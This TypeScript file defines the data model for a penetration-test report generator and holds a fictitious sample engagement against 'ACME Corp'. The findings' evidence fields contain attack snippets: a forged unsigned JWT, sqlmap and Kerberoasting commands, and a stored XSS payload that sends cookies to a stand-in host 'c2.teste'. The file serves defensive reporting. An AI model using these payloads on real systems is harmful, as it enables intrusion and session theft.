// Structured engagement model for the premium PTES report engine.
// The renderers (PDF/DOCX/PPTX) consume this model; charts are derived from `findings`.

export type Severity = 'critical' | 'high' | 'medium' | 'low' | 'info';

export type PtesPhaseId =
    | 'pre-engagement'
    | 'intelligence'
    | 'threat-modeling'
    | 'vulnerability-analysis'
    | 'exploitation'
    | 'post-exploitation'
    | 'reporting';

export interface FindingReference {
    label: string;
    url?: string;
}

export interface Finding {
    id: string; // e.g. "F-01"
    title: string;
    severity: Severity;
    cvss: number; // 0.0 - 10.0
    vector?: string; // CVSS vector string
    cwe: string; // "CWE-89" or "MITRE T1558.003"
    category: string; // "Aplicação Web", "Active Directory", "Rede", "Configuração"
    phase: PtesPhaseId;
    status: 'open' | 'confirmed' | 'remediated';
    affected: string[];
    likelihood: 1 | 2 | 3 | 4 | 5;
    impact: 1 | 2 | 3 | 4 | 5;
    description: string;
    evidence?: { caption: string; code: string };
    businessImpact: string;
    remediation: string;
    references: FindingReference[];
}

// Whitelabel branding: the application's own logo flows into the report, and an optional
// client logo enables co-branded, personalized output. Logos are data URIs (PNG/JPG/SVG)
// when uploaded; when absent the engine falls back to the built-in Suricatoos mark / initials.
export interface Branding {
    appName: string;
    appLogo?: string; // data URI of the whitelabel app logo (operator brand)
    clientName: string;
    clientLogo?: string; // data URI of the client's uploaded logo
    primary?: string; // optional brand color override (hex without '#')
    accent?: string;
}

export type RemediationWindow = 'Imediata' | 'Curto prazo' | 'Médio prazo';

// One beat of the engagement narrative (storytelling), tied to PTES phases and findings.
export interface AttackStep {
    n: number;
    phase: PtesPhaseId;
    title: string;
    text: string;
    refs?: string[]; // finding ids referenced in this beat
}

export interface Engagement {
    branding: Branding;
    client: string;
    title: string;
    classification: string; // "CONFIDENCIAL"
    version: string;
    period: { start: string; end: string };
    author: string;
    contact: string;
    scope: { inScope: string[]; outOfScope: string[] };
    roe: string[];
    summaryNarrative: string[];
    attackStory: AttackStep[];
    riskScore: number; // 0-100
    methodology: { phase: PtesPhaseId; title: string; activities: string[] }[];
    findings: Finding[];
    recommendations: { priority: RemediationWindow; text: string }[];
}

// Effort (1=baixo, 2=médio, 3=alto), ETA in days and remediation window per finding.
// Drives the action plan: quick-wins quadrant (high impact × low effort) and the timeline.
export const REMEDIATION: Record<string, { effort: 1 | 2 | 3; etaDays: number; window: RemediationWindow }> = {
    'F-01': { effort: 1, etaDays: 2, window: 'Imediata' }, // quick win
    'F-02': { effort: 2, etaDays: 5, window: 'Imediata' },
    'F-03': { effort: 1, etaDays: 3, window: 'Imediata' }, // quick win
    'F-04': { effort: 3, etaDays: 20, window: 'Curto prazo' },
    'F-05': { effort: 2, etaDays: 7, window: 'Curto prazo' },
    'F-06': { effort: 2, etaDays: 10, window: 'Curto prazo' },
    'F-07': { effort: 2, etaDays: 14, window: 'Curto prazo' },
    'F-08': { effort: 1, etaDays: 3, window: 'Médio prazo' },
    'F-09': { effort: 1, etaDays: 2, window: 'Médio prazo' },
    'F-10': { effort: 1, etaDays: 1, window: 'Médio prazo' },
};

export const PTES_PHASES: { id: PtesPhaseId; n: number; name: string; short: string }[] = [
    { id: 'pre-engagement', n: 1, name: 'Interações pré-engajamento', short: 'Pré-eng.' },
    { id: 'intelligence', n: 2, name: 'Coleta de inteligência', short: 'Intel.' },
    { id: 'threat-modeling', n: 3, name: 'Modelagem de ameaças', short: 'Ameaças' },
    { id: 'vulnerability-analysis', n: 4, name: 'Análise de vulnerabilidades', short: 'Vulnerab.' },
    { id: 'exploitation', n: 5, name: 'Exploração', short: 'Exploração' },
    { id: 'post-exploitation', n: 6, name: 'Pós-exploração', short: 'Pós-expl.' },
    { id: 'reporting', n: 7, name: 'Relatório', short: 'Relatório' },
];

// ── Fictitious but realistic sample engagement (web + Active Directory) ──────
export const SAMPLE_ENGAGEMENT: Engagement = {
    branding: {
        appName: 'Suricatoos',
        clientName: 'ACME Corp',
        // appLogo / clientLogo left undefined here -> engine renders the built-in marks.
        // In the app these carry uploaded PNG/JPG/SVG data URIs for co-branded output.
        primary: '194FE3',
        accent: 'FF7678',
    },
    client: 'ACME Corp',
    title: 'Avaliação de Segurança Ofensiva — Aplicação Web e Active Directory',
    classification: 'CONFIDENCIAL',
    version: '1.0',
    period: { start: '02/06/2026', end: '06/06/2026' },
    author: 'Equipe Red Team — Suricatoos',
    contact: 'redteam@suricatoos.example',
    scope: {
        inScope: [
            'loja.acme.example, api.acme.example (aplicação de e-commerce e API REST)',
            'vpn.acme.example (acesso remoto)',
            'Faixa interna 10.20.0.0/16 via VPN de teste fornecida',
            'Domínio Active Directory de teste acme.example (DC01 — 10.20.10.5)',
        ],
        outOfScope: [
            'Ataques de negação de serviço (DoS/DDoS) no ambiente compartilhado',
            'Engenharia social contra colaboradores',
            'Ambientes de produção de pagamento (PCI) de terceiros',
        ],
    },
    roe: [
        'Janela de testes: 02–06/jun, fora do horário comercial.',
        'PoCs não destrutivas; leitura mínima necessária para comprovar impacto.',
        'Contato de emergência disponível 24/7 durante a janela.',
        'Dados sensíveis acessados foram tratados conforme acordo de confidencialidade.',
    ],
    summaryNarrative: [
        'A Suricatoos conduziu uma avaliação ofensiva autônoma, orientada pela metodologia PTES, contra a superfície web e a infraestrutura Active Directory autorizadas da ACME Corp.',
        'O engajamento identificou uma postura de risco ALTA: foi possível encadear vulnerabilidades de aplicação até o comprometimento de uma conta privilegiada do domínio de teste, demonstrando um caminho plausível para exposição de toda a base de clientes e controle administrativo do ambiente.',
        'Os achados mais graves — bypass de autenticação por JWT inseguro e injeção de SQL — são exploráveis remotamente, sem autenticação prévia, e devem ser tratados de forma imediata. A seção de recomendações apresenta um roteiro de remediação priorizado por risco de negócio.',
    ],
    attackStory: [
        {
            n: 1,
            phase: 'intelligence',
            title: 'Reconhecimento',
            text: 'A partir de fontes públicas e enumeração autorizada, mapeamos a loja, a API de pedidos e o acesso remoto (VPN), além de um caminho para a rede interna. A superfície exposta já indicava controles de autenticação frágeis.',
        },
        {
            n: 2,
            phase: 'exploitation',
            title: 'Ponto de entrada',
            text: 'A API aceitava tokens JWT sem assinatura (alg=none). Forjamos um token de administrador e obtivemos acesso privilegiado à API — sem precisar de credenciais válidas.',
            refs: ['F-01'],
        },
        {
            n: 3,
            phase: 'exploitation',
            title: 'Acesso aos dados',
            text: 'A busca da loja era vulnerável a SQL Injection, permitindo leitura do banco. Em paralelo, uma falha de autorização (IDOR) expunha pedidos e dados pessoais de outros clientes.',
            refs: ['F-02', 'F-03'],
        },
        {
            n: 4,
            phase: 'post-exploitation',
            title: 'Pivô para a rede interna',
            text: 'O acesso remoto via VPN não exigia segundo fator. Com credenciais obtidas, entramos na rede interna, atingindo o domínio Active Directory de teste.',
            refs: ['F-07'],
        },
        {
            n: 5,
            phase: 'post-exploitation',
            title: 'Escalada de privilégios',
            text: 'Uma conta de serviço com senha fraca permitiu Kerberoasting: extraímos e quebramos o hash offline, assumindo uma conta privilegiada do domínio.',
            refs: ['F-04'],
        },
        {
            n: 6,
            phase: 'reporting',
            title: 'Impacto demonstrado',
            text: 'Encadeando os achados, demonstramos um caminho plausível para expor toda a base de clientes e assumir controle administrativo do ambiente — tudo com provas de conceito não destrutivas, dentro do escopo.',
        },
    ],
    riskScore: 82,
    methodology: [
        {
            phase: 'pre-engagement',
            title: 'Interações pré-engajamento',
            activities: [
                'Definição de escopo, janelas e regras de engajamento (RoE).',
                'Acordo de confidencialidade e canais de comunicação de emergência.',
            ],
        },
        {
            phase: 'intelligence',
            title: 'Coleta de inteligência',
            activities: [
                'OSINT e enumeração passiva de subdomínios (CT logs, DNS).',
                'Fingerprinting de tecnologias, versões e superfícies expostas.',
            ],
        },
        {
            phase: 'threat-modeling',
            title: 'Modelagem de ameaças',
            activities: [
                'Mapeamento de ativos críticos e fluxos de dados (PII, pagamentos).',
                'Identificação de atores e cenários de ataque prioritários.',
            ],
        },
        {
            phase: 'vulnerability-analysis',
            title: 'Análise de vulnerabilidades',
            activities: [
                'Análise de autenticação, sessão e autorização (IDOR/BOLA).',
                'Testes de injeção, configuração de TLS e cabeçalhos de segurança.',
            ],
        },
        {
            phase: 'exploitation',
            title: 'Exploração',
            activities: [
                'Validação prática (PoC) dos achados de aplicação e rede.',
                'Bypass de autenticação, extração inferencial de dados e XSS armazenado.',
            ],
        },
        {
            phase: 'post-exploitation',
            title: 'Pós-exploração',
            activities: [
                'Movimentação lateral e abuso de Kerberos no domínio de teste.',
                'Demonstração de impacto encadeado, sem ações destrutivas.',
            ],
        },
        {
            phase: 'reporting',
            title: 'Relatório',
            activities: [
                'Consolidação de evidências, classificação de risco e recomendações.',
                'Roteiro de remediação priorizado e reteste sugerido.',
            ],
        },
    ],
    findings: [
        {
            id: 'F-01',
            title: 'Bypass de autenticação via JWT com alg=none',
            severity: 'critical',
            cvss: 9.1,
            vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
            cwe: 'CWE-347',
            category: 'Aplicação Web',
            phase: 'exploitation',
            status: 'confirmed',
            affected: ['api.acme.example'],
            likelihood: 5,
            impact: 5,
            description:
                'A API aceita tokens JWT com o cabeçalho {"alg":"none"}, ignorando a verificação de assinatura. Um atacante pode forjar tokens arbitrários, assumindo qualquer identidade e elevando privilégios para administrador.',
            evidence: {
                caption: 'Token forjado (sem assinatura) elevando para role=admin',
                code: 'header  = {"alg":"none","typ":"JWT"}\npayload = {"sub":"10231","role":"admin"}\n# aceito por api.acme.example -> acesso a endpoints administrativos',
            },
            businessImpact:
                'Acesso administrativo completo à API, incluindo dados de todos os clientes e operações privilegiadas.',
            remediation:
                'Fixar o algoritmo esperado (ex.: RS256) no verificador e rejeitar explicitamente "none"; rotacionar segredos e invalidar sessões emitidas.',
            references: [
                { label: 'OWASP — JWT for Java Cheat Sheet' },
                { label: 'CWE-347: Improper Verification of Cryptographic Signature' },
            ],
        },
        {
            id: 'F-02',
            title: 'SQL Injection (boolean/time-based) em /buscar',
            severity: 'critical',
            cvss: 9.4,
            vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L',
            cwe: 'CWE-89',
            category: 'Aplicação Web',
            phase: 'exploitation',
            status: 'confirmed',
            affected: ['loja.acme.example'],
            likelihood: 5,
            impact: 5,
            description:
                'O parâmetro "q" do endpoint de busca é concatenado diretamente na consulta SQL. A extração inferencial de dados foi confirmada (boolean e time-based), permitindo leitura arbitrária do banco.',
            evidence: {
                caption: 'Confirmação de injeção (PoC de leitura, não destrutiva)',
                code: 'sqlmap -u "https://loja.acme.example/buscar?q=tenis" \\\n  --batch --technique=BT --dbms=postgres --banner\n# parameter \'q\' is injectable (boolean-based, time-based)',
            },
            businessImpact:
                'Exfiltração potencial de toda a base de dados (clientes, pedidos, hashes de senha).',
            remediation:
                'Usar consultas parametrizadas/prepared statements e ORM seguro; adicionar WAF como camada defensiva e princípio do menor privilégio no usuário de banco.',
            references: [
                { label: 'OWASP A03:2021 — Injection' },
                { label: 'CWE-89: SQL Injection' },
            ],
        },
        {
            id: 'F-03',
            title: 'IDOR/BOLA em /api/v1/orders/{id}',
            severity: 'high',
            cvss: 8.1,
            vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
            cwe: 'CWE-639',
            category: 'API',
            phase: 'exploitation',
            status: 'confirmed',
            affected: ['api.acme.example'],
            likelihood: 4,
            impact: 4,
            description:
                'Um usuário autenticado lê pedidos de outros clientes apenas alterando o identificador, sem verificação de propriedade no servidor (Broken Object Level Authorization).',
            evidence: {
                caption: 'Acesso ao pedido de outro cliente trocando o id',
                code: 'curl -s https://api.acme.example/api/v1/orders/10232 \\\n  -H "Authorization: Bearer $TOKEN_A" | jq \'{id, customer, total, address}\'\n# -> retorna PII de cliente DISTINTO',
            },
            businessImpact: 'Exposição de PII e histórico de compras de toda a base de clientes.',
            remediation:
                'Validar a propriedade do objeto no servidor (order.customer_id == session.user_id) e usar referências indiretas por usuário; incluir testes de autorização por objeto.',
            references: [{ label: 'OWASP API1:2023 — BOLA' }, { label: 'CWE-639' }],
        },
        {
            id: 'F-04',
            title: 'Kerberoasting de conta de serviço (svc_sql)',
            severity: 'high',
            cvss: 8.0,
            cwe: 'MITRE T1558.003',
            category: 'Active Directory',
            phase: 'post-exploitation',
            status: 'confirmed',
            affected: ['DC01 (10.20.10.5)'],
            likelihood: 4,
            impact: 5,
            description:
                'A conta de serviço svc_sql possui SPN e senha fraca, permitindo solicitar um ticket TGS e quebrar o hash offline, resultando em credenciais privilegiadas no domínio.',
            evidence: {
                caption: 'Extração e quebra offline do hash de serviço',
                code: "GetUserSPNs.py acme.example/teste:'<senha-lab>' -dc-ip 10.20.10.5 -request\nhashcat -m 13100 svc_sql.hash rockyou.txt   # senha recuperada offline",
            },
            businessImpact:
                'Movimentação lateral e elevação para conta privilegiada do domínio de teste.',
            remediation:
                'Adotar gMSA ou senhas longas/aleatórias para contas de serviço; monitorar solicitações TGS-REQ anômalas e remover SPNs desnecessários.',
            references: [{ label: 'MITRE ATT&CK T1558.003' }],
        },
        {
            id: 'F-05',
            title: 'Cross-Site Scripting armazenado em avaliações',
            severity: 'medium',
            cvss: 6.1,
            vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N',
            cwe: 'CWE-79',
            category: 'Aplicação Web',
            phase: 'exploitation',
            status: 'confirmed',
            affected: ['loja.acme.example'],
            likelihood: 3,
            impact: 3,
            description:
                'Payloads persistem no campo de comentário de avaliação e executam no contexto de outros usuários, permitindo roubo de sessão e ações em nome da vítima.',
            evidence: {
                caption: 'Payload persistente em avaliação de produto',
                code: '<img src=x onerror="fetch(\'https://c2.teste/\'+document.cookie)">',
            },
            businessImpact: 'Sequestro de sessão de clientes e potencial fraude.',
            remediation:
                'Codificação de saída por contexto, sanitização no servidor e Content-Security-Policy estrita.',
            references: [{ label: 'OWASP A03:2021' }, { label: 'CWE-79' }],
        },
        {
            id: 'F-06',
            title: 'SMB signing desabilitado (NTLM relay)',
            severity: 'medium',
            cvss: 5.9,
            cwe: 'MITRE T1557.001',
            category: 'Rede',
            phase: 'vulnerability-analysis',
            status: 'confirmed',
            affected: ['10.20.0.0/16'],
            likelihood: 3,
            impact: 3,
            description:
                'Hosts sem assinatura SMB permitem o relay de autenticação NTLM, viabilizando autenticação como a vítima em outros serviços.',
            businessImpact: 'Movimentação lateral e acesso não autorizado a recursos de rede.',
            remediation: 'Habilitar/forçar SMB signing via GPO e desabilitar NTLM onde possível.',
            references: [{ label: 'MITRE ATT&CK T1557.001' }],
        },
        {
            id: 'F-07',
            title: 'Ausência de MFA no acesso VPN',
            severity: 'medium',
            cvss: 6.5,
            cwe: 'CWE-308',
            category: 'Rede',
            phase: 'threat-modeling',
            status: 'confirmed',
            affected: ['vpn.acme.example'],
            likelihood: 4,
            impact: 3,
            description:
                'O acesso remoto via VPN depende apenas de usuário e senha, sem segundo fator, ampliando o impacto de credenciais vazadas.',
            businessImpact: 'Acesso inicial à rede interna a partir de credenciais comprometidas.',
            remediation: 'Exigir MFA resistente a phishing (FIDO2/WebAuthn) no acesso remoto.',
            references: [{ label: 'CWE-308' }],
        },
        {
            id: 'F-08',
            title: 'Cabeçalhos de segurança e configuração TLS fracos',
            severity: 'low',
            cvss: 3.7,
            cwe: 'CWE-693',
            category: 'Configuração',
            phase: 'vulnerability-analysis',
            status: 'confirmed',
            affected: ['loja.acme.example', 'api.acme.example'],
            likelihood: 2,
            impact: 2,
            description:
                'Ausência de cabeçalhos como HSTS, X-Content-Type-Options e CSP, além de suites TLS legadas habilitadas.',
            businessImpact: 'Facilita ataques de downgrade, sniffing e injeção de conteúdo.',
            remediation:
                'Adicionar HSTS, CSP e cabeçalhos defensivos; desabilitar suites TLS legadas.',
            references: [{ label: 'OWASP Secure Headers' }, { label: 'CWE-693' }],
        },
        {
            id: 'F-09',
            title: 'Divulgação de informação em mensagens de erro',
            severity: 'low',
            cvss: 3.1,
            cwe: 'CWE-209',
            category: 'Aplicação Web',
            phase: 'intelligence',
            status: 'confirmed',
            affected: ['api.acme.example'],
            likelihood: 2,
            impact: 2,
            description:
                'Respostas de erro expõem stack traces e versões de componentes, auxiliando o atacante na construção de exploits.',
            businessImpact: 'Reduz o esforço de reconhecimento do atacante.',
            remediation: 'Padronizar respostas de erro genéricas e registrar detalhes apenas no servidor.',
            references: [{ label: 'CWE-209' }],
        },
        {
            id: 'F-10',
            title: 'Divulgação de versões de software (banners)',
            severity: 'info',
            cvss: 0.0,
            cwe: 'CWE-200',
            category: 'Configuração',
            phase: 'intelligence',
            status: 'confirmed',
            affected: ['loja.acme.example'],
            likelihood: 1,
            impact: 1,
            description:
                'Banners de serviço revelam versões exatas de nginx e do runtime, úteis para correlação com CVEs.',
            businessImpact: 'Informativo; contribui para o reconhecimento.',
            remediation: 'Ocultar/normalizar banners e cabeçalhos de versão.',
            references: [{ label: 'CWE-200' }],
        },
    ],
    recommendations: [
        { priority: 'Imediata', text: 'Corrigir o bypass de JWT (F-01) e a SQL Injection (F-02) — exploráveis remotamente sem autenticação.' },
        { priority: 'Imediata', text: 'Revisar a autorização por objeto na API (F-03) para conter exposição de PII.' },
        { priority: 'Curto prazo', text: 'Endurecer o Active Directory: gMSA para contas de serviço (F-04) e SMB signing (F-06).' },
        { priority: 'Curto prazo', text: 'Exigir MFA no acesso remoto (F-07) e aplicar CSP/sanitização contra XSS (F-05).' },
        { priority: 'Médio prazo', text: 'Padronizar cabeçalhos de segurança/TLS (F-08) e reduzir divulgação de informação (F-09, F-10).' },
        { priority: 'Médio prazo', text: 'Reexecutar o engajamento (reteste) para validar todas as correções.' },
    ],
};
